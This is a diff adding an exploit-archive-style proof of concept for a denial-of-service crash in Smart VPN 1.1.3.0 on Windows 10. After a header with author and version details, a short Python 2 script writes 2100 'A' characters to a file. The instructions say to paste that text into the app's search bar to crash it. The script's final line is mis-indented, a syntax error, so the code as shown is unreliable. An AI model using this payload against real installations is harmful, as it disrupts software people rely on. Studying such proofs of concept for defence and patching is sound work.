@@ -1,0 +1,25 @@
+# Exploit Title: Smart VPN 1.1.3.0 - Denial of Service (PoC)
+# Date: 1/28/2018
+# Author: 0xB9
+# Twitter: @0xB9Sec
+# Contact: 0xB9[at]pm.me
+# Software Link: https://www.microsoft.com/store/productId/9NH1G93D4HKR
+# Version: 1.1.3.0
+# Tested on: Windows 10
+
+# Proof of Concept:
+# Run the python script, it will create a new file "PoC.txt"
+# Copy the text from the generated PoC.txt file to clipboard
+# Paste the text in the top right search bar and hit Enter
+# App will now crash
+
+buffer = "A" * 2100
+payload = buffer
+try:
+    f=open("PoC.txt","w")
+    print "[+] Creating %s evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+print "File cannot be created"
